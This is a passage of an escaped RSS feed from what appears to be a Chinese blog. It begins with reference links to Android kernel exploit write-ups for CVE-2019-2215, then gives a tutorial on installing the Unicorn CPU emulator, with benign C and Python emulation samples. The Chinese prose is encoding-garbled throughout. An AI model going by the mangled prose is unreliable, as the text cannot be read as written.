&lt;p>&lt;a class="link" href="https://cloudfuzz.github.io/android-kernel-exploitation/" target="_blank" rel="noopener"
>https://cloudfuzz.github.io/android-kernel-exploitation/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/sharif-dev/AndroidKernelVulnerability" target="_blank" rel="noopener"
>https://github.com/sharif-dev/AndroidKernelVulnerability&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/" target="_blank" rel="noopener"
>https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/" target="_blank" rel="noopener"
>https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Unicornç®€å•å­¦ä¹ ä½¿ç”¨è®°å½•</title><link>https://ykiko.top/p/unicorn%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link><pubDate>Fri, 17 Apr 2020 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/unicorn%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid><description>&lt;h1 id="unicornç®€å•å­¦ä¹ ä½¿ç”¨è®°å½•">Unicornç®€å•å­¦ä¹ ä½¿ç”¨è®°å½•&lt;/h1>
&lt;h3 id="0x00-ä»‹ç»">0x00 ä»‹ç»&lt;/h3>
&lt;p>Unicornæ˜¯ä¸€ä¸ªè½»é‡çº§, å¤šå¹³å°, å¤šæ¶æ„çš„CPUæ¨¡æ‹Ÿå™¨æ¡†æ¶ï¼ŒåŸºäºqemuå¼€å‘ï¼Œå®ƒå¯ä»¥ä»£æ›¿CPUæ¨¡æ‹Ÿä»£ç çš„æ‰§è¡Œï¼Œå¸¸ç”¨äºæ¶æ„ä»£ç åˆ†æï¼ŒFuzzç­‰ã€‚&lt;/p>
&lt;h3 id="0x01-å®‰è£…">0x01 å®‰è£…&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>å®˜ç½‘æœ‰ç¼–è¯‘å¥½ä¸åŒå¹³å°çš„&lt;a class="link" href="http://www.unicorn-engine.org/download/" target="_blank" rel="noopener"
>äºŒè¿›åˆ¶åŒ…&lt;/a>ï¼Œç›´æ¥å®‰è£…å°±è¡Œã€‚ä½†æ˜¯çœ‹äº†ä¸€ä¸‹æ—¶é—´2017å¹´çš„ï¼Œqemuå·²ç»å‡çº§å¥½å‡ ä¸ªç‰ˆæœ¬äº†ã€‚apiä¹Ÿæ¯”è¾ƒè€æ—§ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å»githubçœ‹äº†ä¸€ä¸‹æ˜¯å¦æœ‰åœ¨æ›´æ–°ï¼Œå‘ç°ä¸€ç›´æœ‰åœ¨æ›´æ–°ï¼Œä¸è¿‡å¥½åƒä¹Ÿæ²¡æ›´æ–°å•¥ï¼Œåªæ˜¯ä¿®å¤ä¸€äº›bugï¼Œä¸‹è½½gitæºç ï¼Œè‡ªå·±ç¼–è¯‘ã€‚ç›®å‰æœ€æ–°1.0.2rc&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git clone https://github.com/unicorn-engine/unicorn.git
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> unicorn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># UNICORN_ARCHS=&amp;#34;arm aarch64 x86&amp;#34; ./make.sh # è®¾ç½®è¦ç¼–è¯‘çš„æ¶æ„ å¯é€‰ é»˜è®¤6ç§å…¨ç¼–è¯‘ (Arm, Arm64, M68K, Mips, Sparc, &amp;amp; X86)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./make.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo ./make.sh install
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># python ç»‘å®š&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> bindings/python
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo python3 setup.py install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿˜æœ‰æ›´å¤šäº¤å‰ç¼–è¯‘é€‰é¡¹å‚è€ƒ &lt;a class="link" href="https://github.com/unicorn-engine/unicorn/blob/master/docs/COMPILE-NIX.md" target="_blank" rel="noopener"
>æ–‡æ¡£&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="0x02-ç®€å•ä½¿ç”¨">0x02 ç®€å•ä½¿ç”¨&lt;/h3>
&lt;p>C :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unicorn/unicorn.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// è¦æ¨¡æ‹Ÿçš„æŒ‡ä»¤
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#define X86_CODE32 &amp;#34;\x41\x4a&amp;#34; &lt;/span>&lt;span class="c1">// INC ecx; DEC edx
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// èµ·å§‹åœ°å€
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#define ADDRESS 0x1000000
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[]){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// è®¾ç½®engine
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">uc_engine&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">uc_err&lt;/span> &lt;span class="n">err&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//è®¾ç½®å¯„å­˜å™¨
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">r_ecx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">r_edx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x5678&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Emulate i386 code&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// x86 32bit åˆå§‹åŒ–
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">err&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">uc_open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_ARCH_X86&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_MODE_32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">UC_ERR_OK&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed on uc_open() with error returned: %u&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">err&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ç»™æ¨¡æ‹Ÿå™¨ç”³è¯· 2MB å†…å­˜
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">uc_mem_map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ADDRESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">1024&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_PROT_ALL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// å°†è¦æ¨¡æ‹Ÿçš„æŒ‡ä»¤å†™å…¥å†…å­˜
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">uc_mem_write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ADDRESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">X86_CODE32&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">X86_CODE32&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed to write emulation code to memory, quit!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// åˆå§‹åŒ–å¯„å­˜å™¨
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">uc_reg_write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_X86_REG_ECX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">r_ecx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">uc_reg_write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_X86_REG_EDX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">r_edx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;gt;&amp;gt;&amp;gt; ECX = 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">r_ecx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;gt;&amp;gt;&amp;gt; EDX = 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">r_edx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// æ¨¡æ‹Ÿä»£ç 
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">err&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">uc_emu_start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ADDRESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ADDRESS&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">X86_CODE32&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">err&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed on uc_emu_start() with error returned %u: %s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">err&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">uc_strerror&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">err&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// æ‰“å°å¯„å­˜å™¨å€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Emulation done. Below is the CPU context&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">uc_reg_read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_X86_REG_ECX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">r_ecx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">uc_reg_read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">UC_X86_REG_EDX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">r_edx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;gt;&amp;gt;&amp;gt; ECX = 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">r_ecx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;gt;&amp;gt;&amp;gt; EDX = 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">r_edx&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">uc_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">uc&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200411000429.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å®˜æ–¹ç»™äº†å¾ˆå¤šæµ‹è¯•&lt;a class="link" href="https://github.com/unicorn-engine/unicorn/tree/master/samples" target="_blank" rel="noopener"
>æ¡ˆä¾‹&lt;/a>&lt;/p>
&lt;p>python3:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">__future__&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">print_function&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">unicorn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">unicorn.x86_const&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">X86_CODE32&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x41\x4a&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="c1">#INC ecx; DEC edx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ADDRESS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x1000000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Emulate i386 code&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">## åˆå§‹åŒ–æ¨¡æ‹Ÿå™¨ä¸ºx86 32bit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mu&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Uc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_ARCH_X86&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">UC_MODE_32&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># mu = Uc(UC_ARCH_ARM64,UC_MODE_64)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">## 2MB çš„memory&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">mem_map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ADDRESS&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">## &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">mem_write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ADDRESS&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">X86_CODE32&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">##&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reg_write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_X86_REG_ECX&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reg_write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">UC_X86_REG_EDX&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x7890&lt;/span>&lt;span class="p">)&lt;/span>
